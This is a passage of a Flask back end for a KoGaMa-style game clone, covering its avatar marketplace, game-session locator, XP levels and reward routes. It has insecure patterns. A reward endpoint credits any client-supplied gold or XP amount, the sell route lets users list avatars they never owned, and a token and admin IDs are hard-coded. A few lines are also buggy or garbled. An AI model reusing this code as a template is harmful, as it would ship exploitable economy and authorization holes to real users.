    """Totals consumed by the SPA at /model/market/total/ (drives the (N)(M) labels)."""
    avatar_count = MarketplaceListing.query.filter_by(is_active=True, item_type='avatar').count()
    model_count = MarketplaceListing.query.filter_by(is_active=True, item_type='model').count()
    return jsonify({'avatars': avatar_count, 'models': model_count, 'data': {'avatars': avatar_count, 'models': model_count}}), 200


@app.route('/model/market/total/<int:profile_id>/', methods=['GET'])
def marketplace_total_profile(profile_id):
    """Per-user totals consumed by the profile marketplace page (/model/market/total/<id>/)."""
    owned = Avatar.query.filter_by(user_id=profile_id).count()
    avatar_count = owned if owned else 1  # equipped built-in avatar fallback
    model_count = MarketplaceListing.query.filter_by(is_active=True, item_type='model', seller_id=profile_id).count()
    return jsonify({'avatars': avatar_count, 'models': model_count, 'data': {'avatars': avatar_count, 'models': model_count}}), 200


@app.route('/model/market/<product_id>/', methods=['GET'])
def marketplace_product_detail(product_id):
    """Detail page API: resolves avatar_<id> or marketplace listing id."""
    if isinstance(product_id, str) and product_id.startswith('avatar_'):
        try:
            avatar_id = int(product_id.split('_', 1)[1])
        except (ValueError, IndexError):
            abort(404)
        avatar = db.session.query(Avatar).filter_by(id=avatar_id).first()
        if not avatar:
            abort(404)
        u = db.session.get(User, avatar.user_id)
        item = _avatar_to_marketplace_item(u, avatar, avatar.avatar_name, is_builtin=False)
        item['has_liked'] = False
        item['category'] = 'avatar'
        return jsonify(_rewrite_image_urls(item)), 200
    try:
        listing_id = int(product_id)
    except (ValueError, TypeError):
        abort(404)
    listing = db.session.get(MarketplaceListing, listing_id)
    if not listing or not listing.is_active:
        abort(404)
    d = listing.to_dict()
    d['has_liked'] = False
    return jsonify(_rewrite_image_urls(d)), 200


@app.route('/model/market/', methods=['GET'])
@cache_anon(60)
def marketplace_items():
    """Listings consumed by the SPA at /model/market/?category=avatar|model&page=&count=&order=&popular=1&author_profile_id=<id>."""
    page = request.args.get('page', 1, type=int)
    count = request.args.get('count', 24, type=int)
    category = request.args.get('category', 'avatar')
    popular = request.args.get('popular', type=int)
    likes = request.args.get('likes', type=int)
    order = request.args.get('order', '')
    author_profile_id = request.args.get('author_profile_id', type=int)

    if page < 1: page = 1
    if count < 1 or count > 100: count = 24

    if author_profile_id:
        # Profile marketplace: show the user's avatars (owned rows, else equipped built-in) plus their active listings.
        u = db.session.get(User, author_profile_id)
        items = []
        owned = db.session.query(Avatar).filter_by(user_id=author_profile_id).all()
        for av in owned:
            items.append(_avatar_to_marketplace_item(u, av, av.avatar_name, is_builtin=False))
        if not owned and u:
            builtin = u.AVATAR_IMAGES_MAP.get(u.avatar_id)
            if builtin:
                items.append(_avatar_to_marketplace_item(u, builtin, builtin.get("avatar_name", "Avatar"), is_builtin=True))
        for l in MarketplaceListing.query.filter_by(is_active=True, seller_id=author_profile_id).all():
            items.append(l.to_dict())
        if category == 'model':
            items = [i for i in items if i.get('item_type') == 'model']
        elif category == 'avatar':
            items = [i for i in items if i.get('item_type', 'avatar') == 'avatar']
        total = len(items)
        total_pages = (total + count - 1) // count if total > 0 else 1
        if page > total_pages:
            page = total_pages
        start = (page - 1) * count
        page_items = items[start:start + count]
        return jsonify({
            'data': _rewrite_image_urls(page_items),
            'paging': {
                'page': page,
                'count': count,
                'total': total,
                'pages': total_pages,
                'prev_url': f'/model/market/?page={page-1}&count={count}' if page > 1 else '',
                'next_url': f'/model/market/?page={page+1}&count={count}' if page < total_pages else ''
            }
        }), 200

    query = MarketplaceListing.query.filter_by(is_active=True)
    if category in ('avatar', 'model'):
        query = query.filter_by(item_type=category)

    if order == 'oldest' and not (popular or likes):
        query = query.order_by(MarketplaceListing.created_at.asc())
    else:
        query = query.order_by(MarketplaceListing.created_at.desc())

    total = query.count()
    total_pages = (total + count - 1) // count if total > 0 else 1
    if page > total_pages:
        page = total_pages

    listings = query.offset((page - 1) * count).limit(count).all()

    return jsonify({
        'data': _rewrite_image_urls([l.to_dict() for l in listings]),
        'paging': {
            'page': page,
            'count': count,
            'total': total,
            'pages': total_pages,
            'prev_url': f'/model/market/?page={page-1}&count={count}' if page > 1 else '',
            'next_url': f'/model/market/?page={page+1}&count={count}' if page < total_pages else ''
        }
    }), 200


@app.route('/api/marketplace/listing/', methods=['POST'])
def create_marketplace_listing():
    """Create a new marketplace listing (only for authenticated users)."""
    if not current_user.is_authenticated:
        return jsonify({'error': 'Authentication required'}), 401

    data = request.get_json(silent=True) or {}
    item_type = data.get('item_type')
    item_id = data.get('item_id')
    price_gold = data.get('price_gold')
    description = data.get('description', '').strip()

    if not item_type or not item_id or price_gold is None:
        return jsonify({'error': 'Missing required fields: item_type, item_id, price_gold'}), 400

    if price_gold < 0:
        return jsonify({'error': 'Price cannot be negative'}), 400

    # Verify that the user owns the item (basic check – you may expand this)
    if item_type == 'avatar':
        avatar = db.session.query(Avatar).filter_by(id=item_id, user_id=current_user.id).first()
        if not avatar:
            return jsonify({'error': 'You do not own this avatar or it does not exist'}), 403
    else:
        return jsonify({'error': 'Unsupported item_type'}), 400

    # Check if an active listing already exists for this item
    existing = MarketplaceListing.query.filter_by(
        seller_id=current_user.id,
        item_type=item_type,
        item_id=item_id,
        is_active=True
    ).first()
    if existing:
        return jsonify({'error': 'You already have an active listing for this item'}), 400

    listing = MarketplaceListing(
        seller_id=current_user.id,
        item_type=item_type,
        item_id=item_id,
        price_gold=price_gold,
        description=description
    )
    db.session.add(listing)
    db.session.commit()
    return jsonify(listing.to_dict()), 201


@app.route('/api/marketplace/listing/<int:listing_id>/', methods=['DELETE'])
def delete_marketplace_listing(listing_id):
    """Delete a listing (only the seller or admin can delete)."""
    listing = db.session.get(MarketplaceListing, listing_id)
    if not listing:
        return jsonify({'error': 'Listing not found'}), 404

    if not current_user.is_authenticated or (listing.seller_id != current_user.id and current_user.id not in [1, 2]):
        return jsonify({'error': 'Permission denied'}), 403

    if not listing.is_active:
        return jsonify({'error': 'Listing already inactive'}), 400

    listing.is_active = False
    db.session.commit()
    return jsonify({'message': 'Listing deactivated'}), 200


@app.route('/api/marketplace/buy/<int:listing_id>/', methods=['POST'])
def buy_marketplace_listing(listing_id):
    """Buy a listing – transfers gold and item ownership."""
    if not current_user.is_authenticated:
        return jsonify({'error': 'Authentication required'}), 401

    listing = db.session.get(MarketplaceListing, listing_id)
    if not listing or not listing.is_active:
        return jsonify({'error': 'Listing not available'}), 404

    if listing.seller_id == current_user.id:
        return jsonify({'error': 'You cannot buy your own listing'}), 400

    seller = db.session.get(User, listing.seller_id)
    if not seller:
        return jsonify({'error': 'Seller not found'}), 404

    if current_user.gold < listing.price_gold:
        return jsonify({'error': f'Insufficient gold. You have {current_user.gold}, need {listing.price_gold}'}), 400

    # Perform the transaction (atomic)
    try:
        # Deduct gold from buyer
        current_user.gold -= listing.price_gold
        # Add gold to seller
        seller.gold += listing.price_gold
        log_gold(current_user, -listing.price_gold, reason='Marketplace purchase', admin_id=None)
        log_gold(seller, listing.price_gold, reason='Marketplace sale', admin_id=None)

        # Transfer item ownership based on type
        if listing.item_type == 'avatar':
            avatar = db.session.query(Avatar).filter_by(id=listing.item_id).first()
            if not avatar:
                raise Exception('Avatar no longer exists')
            # Change owner
            avatar.user_id = current_user.id
            avatar.username = current_user.username
            # If the seller was using this avatar, switch them to default
            if seller.avatar_id == avatar.avatar_id:
                seller.avatar_id = 17873  # default Block Boy
        else:
            raise Exception('Unsupported item type for transfer')

        # Mark listing as inactive (sold)
        listing.is_active = False
        db.session.commit()
        return jsonify({
            'message': 'Purchase successful!',
            'new_gold': current_user.gold,
            'item': avatar.to_dict() if listing.item_type == 'avatar' else None
        }), 200

    except Exception as e:
        db.session.rollback()
        return jsonify({'error': f'Transaction failed: {str(e)}'}), 500


def _build_marketplace_object_data(user_language, category):
    object_data = {
        "ADSONPAGE": True,
        "category": category,
        "locale": user_language,
        "referrers": [
            {"referrer_id": 1, "name": "Kagama", "codename": "kogama", "urls": ""},
            {"referrer_id": 2, "name": "old_spilgames", "codename": "OldSpilGames", "urls": ""},
            {"referrer_id": 3, "name": "AdNPlay", "codename": "adnplay", "urls": ""},
            {"referrer_id": 4, "name": "GSM", "codename": "gsm", "urls": "games\\.poki\\.com|..."},
            {"referrer_id": 5, "name": "Miniplay", "codename": "miniplay", "urls": "minijuegos\\.com|..."},
            {"referrer_id": 6, "name": "ORANGE", "codename": "orange", "urls": "kizi\\.com|..."},
            {"referrer_id": 7, "name": "CRAZYGAMES", "codename": "crazygames", "urls": "crazygames\\.com|..."},
            {"referrer_id": 8, "name": "SpilGames", "codename": "spilgames", "urls": "cdn\\.gameplayer\\.io|..."}
        ],
        "ads_data": {
            "host": "www.kogama.com",
            "ref": 1,
            "consent": True,
            "name": "Google AdManager (old account)",
            "ads": {
                "top_banner": {"num": "0", "id": "kogama_mobile_leaderboard_1", "ad_unit_code": "leaderboard", "sizes": "[728, 90]", "huge_sizes": "[[980, 90], [970, 90], [950, 90]]", "big_sizes": "[[980, 90], [970, 90], [950, 90]]", "mid_sizes": "[[728, 90],[468, 60]]", "small_sizes": "[[320, 50], [300, 50]]"},
                "skyscraper_left": {"num": "1", "id": "kogama-skyscraper-left", "sizes": "[160, 600]"},
                "skyscraper_right": {"num": "2", "id": "kogama-skyscraper-right", "sizes": "[160, 600]"},
                "bottom_banner": {"num": "4", "id": "kogama_mobile_leaderboard_2", "sizes": "[728, 90]"},
                "comment_ad": {"num": "5", "id": "kagama_rectangle", "sizes": "[300, 250]"},
                "wide_skyscraper": {"num": "3", "id": "kagama-wide-skyscraper", "sizes": "[300, 600]"},
                "game_list_banner": {"num": "6", "id": "kagama_mobile_game_list_banner", "sizes": "[728, 90]"}
            },
            "network_code": "46278883"
        }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    return object_data


def _render_marketplace_shell(user_language, category, profile_user=None):
    object_data = _build_marketplace_object_data(user_language, category)
    if profile_user:
        object_data["object"] = {
            "gold": profile_user.gold,
            "friends": profile_user.friends,
            "last_ping": profile_user.last_ping.isoformat() if profile_user.last_ping else "",
            "leaderboard_rank": profile_user.rank,
            "is_anonymous": False,
            "next_level_xp": profile_user.next_level_xp,
            "id": profile_user.id,
            "xp": profile_user.xp,
            "created": profile_user.created.isoformat() if profile_user.created else "",
            "level_progress": profile_user.level_progress,
            "level_images": get_level_images(profile_user._level),
            "previous_level_xp": profile_user.previous_level_xp,
            "images": profile_user.AVATAR_IMAGES_MAP.get(profile_user.avatar_id, {}),
            "username": "KaGaMa",
            "is_me": current_user.is_authenticated and current_user.id == profile_user.id,
            "published": 0,
            "xp_to_next_level": profile_user.xp_to_next_level,
            "avatar_id": 17873,
            "friends_limit": 999,
            "notifications": 0,
            "level": profile_user._level,
            "description": profile_user.description,
            "is_active": True,
            "pulse_status": profile_user.pulse_status,
            "is_authenticated": False,
            "is_subscriber": False,
            "object_type_id": 1
        }
        object_data["created_avatar"] = {
            "user_id": profile_user.id,
            "username": profile_user.username,
            "avatar_id": 17873,
            "images": profile_user.AVATAR_IMAGES_MAP.get(profile_user.avatar_id, {}),
            "avatar_name": profile_user.AVATAR_IMAGES_MAP.get(profile_user.avatar_id, {}).get("avatar_name", ""),
            "is_active": True
        }
        object_data["id"] = profile_user.id
    return render_template('kagama.html', language=user_language,
                           title="KaGaMa Marketplace - Buy and Sell Avatars & More!",
                           error_data="null", breadcrumb_data="null",
                           submenu_data="null", object_data=object_data), 200


@app.route('/marketplace/')
def marketplace_page():
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    return _render_marketplace_shell(user_language, None)


@app.route('/marketplace/<category>/')
def marketplace_category_page(category):
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    return _render_marketplace_shell(user_language, category)


@app.route('/marketplace/<category>/<product_id>/')
def marketplace_product_page(category, product_id):
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    return _render_marketplace_shell(user_language, category)


@app.route('/profile/<int:user_id>/marketplace/')
def profile_marketplace_page(user_id):
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    profile_user = db.session.get(User, user_id)
    if not profile_user:
        abort(404)
    return _render_marketplace_shell(user_language, None, profile_user=profile_user)


@app.route('/profile/<int:user_id>/marketplace/<category>/')
def profile_marketplace_category_page(user_id, category):
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    profile_user = db.session.get(User, user_id)
    if not profile_user:
        abort(404)
    return _render_marketplace_shell(user_language, category, profile_user=profile_user)

SELL_FORM_HTML = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sell an Avatar - KaGaMa</title>
<style>
  body { font-family: Arial, sans-serif; background:#10141f; color:#e8edf5; margin:0; padding:32px; }
  .wrap { max-width:760px; margin:0 auto; }
  h1 { font-size:22px; }
  .grid { display:flex; flex-wrap:wrap; gap:12px; margin:18px 0; }
  .opt { width:96px; text-align:center; cursor:pointer; }
  .opt input { display:none; }
  .opt img { width:96px; height:120px; object-fit:cover; border:3px solid transparent; border-radius:10px; background:#1c2230; }
  .opt input:checked + img { border-color:#ffcf3f; }
  .opt span { display:block; font-size:12px; margin-top:4px; }
  .price { font-size:16px; padding:10px; width:160px; border-radius:8px; border:1px solid #333; background:#1c2230; color:#fff; }
  button { margin-top:18px; padding:12px 22px; border:0; border-radius:8px; background:#ffcf3f; color:#111; font-weight:700; cursor:pointer; font-size:15px; }
  a.back { color:#8fb7ff; display:inline-block; margin-bottom:14px; }
</style>
</head>
<body>
<div class="wrap">
  <a class="back" href="/profile/{{ user_id }}/marketplace/avatar/">&larr; Back to my marketplace</a>
  <h1>Sell an Avatar</h1>
  <p>Choose an avatar from the catalog and set your gold price. Listing it creates a marketplace offer under your profile.</p>
  <form method="post">
    <div class="grid">
      {% for a in avatars %}
      <label class="opt">
        <input type="radio" name="avatar_id" value="{{ a.avatar_id }}" required>
        <img src="{{ a.image }}" alt="{{ a.avatar_name }}">
        <span>{{ a.avatar_name }}</span>
      </label>
      {% endfor %}
    </div>
    <p>Price (gold): <input class="price" type="number" name="price_gold" min="0" value="1000" required></p>
    <button type="submit">List for sale</button>
  </form>
</div>
</body>
</html>"""


@app.route('/profile/<int:user_id>/marketplace/sell/', methods=['GET', 'POST'])
def profile_marketplace_sell(user_id):
    if not current_user.is_authenticated:
        return redirect('/auth/login/')
    if current_user.id != user_id:
        abort(403)
    if request.method == 'POST':
        avatar_id = request.form.get('avatar_id', type=int)
        price_gold = request.form.get('price_gold', type=int)
        if not avatar_id or price_gold is None or price_gold < 0:
            return 'Invalid input', 400
        imgs = User.AVATAR_IMAGES_MAP.get(avatar_id)
        if not imgs:
            return 'Unknown avatar', 400
        avatar = db.session.query(Avatar).filter_by(user_id=current_user.id, avatar_id=avatar_id).first()
        if not avatar:
            avatar = Avatar(user_id=current_user.id, username=current_user.username,
                           avatar_id=avatar_id, avatar_name=imgs.get('avatar_name', ''),
                           images=json.dumps(imgs), is_active=True)
            db.session.add(avatar)
            db.session.flush()
        existing = MarketplaceListing.query.filter_by(seller_id=current_user.id,
                                                      item_type='avatar', item_id=avatar.id,
                                                      is_active=True).first()
        if existing:
            return 'You already have an active listing for this avatar', 400
        listing = MarketplaceListing(seller_id=current_user.id, item_type='avatar',
                                    item_id=avatar.id, price_gold=price_gold,
                                    description=imgs.get('avatar_name', '') + ' avatar',
                                    is_active=True)
        db.session.add(listing)
        db.session.commit()
        return redirect(f'/profile/{user_id}/marketplace/avatar/')

    avatars = [{'avatar_id': aid, 'avatar_name': v.get('avatar_name', ''),
                'image': v.get('large', '')} for aid, v in User.AVATAR_IMAGES_MAP.items()]
    return render_template_string(SELL_FORM_HTML, avatars=avatars, user_id=user_id)


# ==================================================
#  END OF MARKETPLACE ROUTES
# ==================================================

# ==================================================
#  YOUR EXISTING ERROR HANDLERS AND FINAL BLOCK
#  (unchanged)
# ==================================================

@app.route('/locator/session', methods=['POST'])
def locator_session():
    if not current_user.is_authenticated:
        return jsonify({'error': 'Not authenticated'}), 401
    data = request.get_json(silent=True) or {}
    game_id = data.get('id', 0)
    game_name = data.get('name', 'Unknown Game')
    game_image = data.get('image_large', '')
    session_id = str(uuid.uuid4())
    session_token = str(uuid.uuid4())
    token = str(uuid.uuid4())
    base_url = request.host_url.rstrip('/')
    # Game server configuration - UPDATE THESE FOR YOUR VPS
    GAME_SERVER_IP = "15.204.238.118"
    GAME_SERVER_PORT = "5055"  # Photon default UDP port
    GAME_SERVER_HOST = f"{GAME_SERVER_IP}:{GAME_SERVER_PORT}"

    game_session_data = {
        'serverIP': GAME_SERVER_HOST,
        'profileID': current_user.id,
        'planetID': game_id,
        'gameMode': 0,
        'language': current_user.language,
        'embedded': False,
        'embeddedSite': '',
        'token': token,
        'sessionToken': session_token,
        'newPlanetName': session_id,
        'planetName': game_name,
        'planetImageURL': game_image,
        'pingURL': f'{base_url}/locator/session/{session_id}/ping',
        'disconnectURL': f'{base_url}/locator/session/{session_id}/leave',
        'gameRewardURL': f'{base_url}/api/reward/game-claim',
        'gamePublishedURL': '',
        'purchaseGoldURL': '',
        'loginURL': f'{base_url}/auth/login/',
        'signupURL': f'{base_url}/user/',
        'idleURL': '',
        'disconnectedURL': '',
        'playerProfileURL': f'{base_url}/profile/{current_user.id}/',
        'eliteUpgradeURL': '',
        'region': 'EU',
        'ezKey': '',
        'reauthURL': f'{base_url}/locator/session/{session_id}/reauth',
        'gameRewardDataURL': f'{base_url}/api/reward/game-data',
        'referrer': '',
        'detailedStats': False,
        'playButtonAdsEnabledDefault': False,
        'boostersEnabledDefault': False,
        'interstitialsAdsEnabledDefault': False,
        'rewardedAdsEnabledDefault': False
    }
    return jsonify({
        'hostName': request.host,
        'id': session_id,
        'objectID': 0,
        'profileID': current_user.id,
        'serverIP': GAME_SERVER_HOST,
        'sessionID': session_id,
        'sessionToken': session_token,
        'token': token,
        'udpPort': 5055,
        'wsPort': 9090,
        'wssPort': 9091,
        'gameSessionData': game_session_data
    }), 200


@app.route('/locator/session/<session_id>/ping', methods=['GET', 'POST'])
def locator_session_ping(session_id):
    return jsonify({}), 200


@app.route('/locator/session/<session_id>/leave', methods=['POST'])
def locator_session_leave(session_id):
    return jsonify({}), 200


@app.route('/locator/session/<session_id>/reauth', methods=['GET'])
def locator_session_reauth(session_id):
    if not current_user.is_authenticated:
        return jsonify({'error': 'Not authenticated'}), 401
    base_url = request.host_url.rstrip('/')
    return jsonify({
        'serverIP': GAME_SERVER_HOST,
        'profileID': current_user.id,
        'token': str(uuid.uuid4()),
        'sessionToken': str(uuid.uuid4()),
        'loginURL': f'{base_url}/auth/login/',
        'signupURL': f'{base_url}/user/',
        'playerProfileURL': f'{base_url}/profile/{current_user.id}/'
    }), 200


@app.route('/api/level/<int:profile_id>', methods=['GET'])
def api_level_init(profile_id):
    user = db.session.get(User, profile_id)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    lvl = user.level
    badge_url_data = []
    for b_level in user.LEVEL_XP_MAP.keys():
        badge_url_data.append({
            'Level': b_level,
            'URL': user.LEVEL_IMAGES_MAP.get(b_level, {}).get('image_path_url', ''),
            'FriendsLimit': 999
        })
    return jsonify({
        'Level': lvl,
        'XP': user.xp,
        'XPLevelLimits': {
            'PrevXP': user.previous_level_xp,
            'NextXP': user.next_level_xp,
            'Level': lvl
        },
        'BadgeUrlData': badge_url_data
    }), 200


@app.route('/api/level/xp_limits', methods=['GET'])
def api_xp_limits():
    data = []
    for lvl, xp in User.LEVEL_XP_MAP.items():
        next_xp = User.LEVEL_XP_MAP.get(lvl + 1, xp)
        data.append({
            'level': lvl,
            'prev_xp': xp,
            'next_xp': next_xp
        })
    return jsonify({'data': data}), 200


@app.route('/api/reward/game-play', methods=['GET'])
def api_reward_game_play():
    return jsonify({
        'rewardEnabled': True,
        'timeInSeconds': 300,
        'gold': 50
    }), 200


@app.route('/api/reward/game-data', methods=['GET'])
def api_reward_game_data():
    return jsonify({
        'rewardEnabled': True,
        'timeInSeconds': 600,
        'xp': 100
    }), 200


@app.route('/api/reward/game-claim', methods=['POST'])
def api_reward_game_claim():
    if not current_user.is_authenticated:
        return jsonify({'error': 'Not authenticated'}), 401
    data = request.get_json(silent=True) or {}
    reward_type = data.get('type', 'gold')
    amount = data.get('amount', 0)
    if reward_type == 'gold':
        current_user.gold += amount
        log_gold(current_user, amount, reason='Game reward', admin_id=None)
    elif reward_type == 'xp':
        lvl_before = current_user._level
        current_user.xp += amount
        log_xp(current_user, amount, lvl_before, current_user._level, reason='Game reward', admin_id=None)
    db.session.commit()
    return jsonify({}), 200


@app.errorhandler(404)
def page_not_found(e):
    title = "Does not exist"
    error_data = json.dumps({'message': 'Does not exist', 'code': 404}, indent=3)
    error_data = json.dumps(error_data)
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    object_data = {
       "ADSONPAGE": True,
       "category": None,
       "locale": user_language,
       "referrers": [
          {
             "referrer_id": 1,
             "name": "Kagama",
             "codename": "kogama",
             "urls": ""
          },
          {
             "referrer_id": 2,
             "name": "old_spilgames",
             "codename": "OldSpilGames",
             "urls": ""
          },
          {
             "referrer_id": 3,
             "name": "AdNPlay",
             "codename": "adnplay",
             "urls": ""
          },
          {
             "referrer_id": 4,
             "name": "GSM",
             "codename": "gsm",
             "urls": "games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"
          },
          {
             "referrer_id": 5,
             "name": "Miniplay",
             "codename": "miniplay",
             "urls": "minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"
          },
          {
             "referrer_id": 6,
             "name": "ORANGE",
             "codename": "orange",
             "urls": "kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"
          },
          {
             "referrer_id": 7,
             "name": "CRAZYGAMES",
             "codename": "crazygames",
             "urls": "crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"
          },
          {
             "referrer_id": 8,
             "name": "SpilGames",
             "codename": "spilgames",
             "urls": "cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"
          }
       ],
       "ads_data": {
          "host": "www.kogama.com",
          "ref": 1,
          "consent": True,
          "name": "Google AdManager (old account)",
          "ads": {
             "top_banner": {
                "num": "0",
                "id": "kogama_mobile_leaderboard_1",
                "ad_unit_code": "leaderboard",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "skyscraper_left": {
                "num": "1",
                "id": "kogama-skyscraper-left",
                "ad_unit_code": "skyscraper_left",
                "sizes": "[160, 600]"
             },
             "skyscraper_right": {
                "num": "2",
                "id": "kogama-skyscraper-right",
                "ad_unit_code": "skyscraper",
                "sizes": "[160, 600]"
             },
             "bottom_banner": {
                "num": "4",
                "id": "kogama_mobile_leaderboard_2",
                "ad_unit_code": "leaderboard_bottom",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "comment_ad": {
                "num": "5",
                "id": "kogama_rectangle",
                "ad_unit_code": "rectangle",
                "sizes": "[300, 250]"
             },
             "wide_skyscraper": {
                "num": "3",
                "id": "kogama-wide-skyscraper",
                "ad_unit_code": "wide_skyscraper",
                "sizes": "[300, 600]"
             },
             "game_list_banner": {
                "num": "6",
                "id": "kogama_mobile_game_list_banner",
                "ad_unit_code": "game_list_banner",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             }
          },
          "network_code": "46278883"
       }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
